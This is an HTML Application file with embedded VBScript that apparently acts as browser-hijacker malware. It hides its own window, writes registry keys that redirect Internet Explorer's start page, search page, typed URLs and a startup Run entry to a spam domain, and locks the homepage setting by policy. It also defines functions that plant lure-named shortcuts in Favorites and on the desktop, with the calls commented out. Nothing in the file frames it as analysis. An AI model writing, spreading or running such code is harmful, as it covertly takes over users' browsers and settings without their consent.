<html>
<HTA:APPLICATION caption="no" border="none" windowState="minimize" visiable="no" showintaskbar="no">
<body onload="window.blur();">

<object id='wsh' classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'></object>
<script LANGUAGE="VBScript">
on error resume next
window.moveTo -1000,-1000
wsh.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "http://spammervietnam.com"
wsh.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "http://spammervietnam.com"
wsh.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Search Page", "http://spammervietnam.com" 
wsh.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\default_page_url", "http://spammervietnam.com"
wsh.RegWrite "HKCU\Software\Microsoft\Internet Explorer\TypedURLs\url1","http://spammervietnam.com"
wsh.RegWrite "HKCU\Software\Microsoft\Internet Explorer\TypedURLs\url2","http://spammervietnam.com"
wsh.RegWrite "HKCU\Software\Microsoft\Internet Explorer\TypedURLs\url3","http://spammervietnam.com"
wsh.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\First Home Page","http://spammervietnam.com"
wsh.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\First Home Page","http://spammervietnam.com"
wsh.RegWrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\HomePage","1","REG_DWORD"
wsh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\IEXPLORE.EXE", "http://spammervietnam.com"
wsh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools","0","REG_DWORD"
wsh.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Window Title", "-->WWW.langNghe.net  Film,music,Study...online <--"
wsh.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Toolbar\\LinksFolderName","<-- WWW.langNghe.net -->"
window.close
</script>
<script LANGUAGE="VBScript">
'Call LongFei_AddFavorites("´óÑ§Í¬×ÀÐ¡ÁáµÄÕÕÆ¬","http://spammervietnam.com")
'Call LongFei_AddFavorites("¡¾Ãâ·ÑDVDµçÓ°¡¿","http://spammervietnam.com")

on error resume next
'Call LongFei_AddDesktop("ÃÀÅ®Ð´ÕæÃâ·ÑÌá¹©","http://spammervietnam.com")
'Call LongFei_AddDesktop("Ð¡µçÓ°ÔÚÏßÃâ·Ñ¿´","http://spammervietnam.com")

on error resume next
'Call LongFei_AddQuickLaunch("[10ÍòÔÚÏßÒôÀÖÃâ·ÑÌýÏÂÔØ]","http://spammervietnam.com")
'Call LongFei_AddQuickLaunch("ÅóÓÑµÄ¸ßÖÐÅ®Í¬Ñ§","http://spammervietnam.com")

Function LongFei_AddFavorites(N, U)
on error resume next
Set S = wsh.CreateShortcut(wsh.SpecialFolders("Favorites") + "/" + N +".URL")
S.TargetPath = U 
S.Save()
Set Sl = wsh.CreateShortcut(wsh.SpecialFolders("Favorites") + "/Á´½Ó/" + N +".URL")
Sl.TargetPath = U
Sl.Save()
End Function

Function LongFei_AddDesktop(N, U)
on error resume next
Set S = wsh.CreateShortcut(wsh.SpecialFolders("AllUsersDesktop") + "/" + N +".URL")
S.TargetPath = U 
S.Save()
End Function

</script>
<script language="javascript">
window.close();
</script>
</body>
</html>
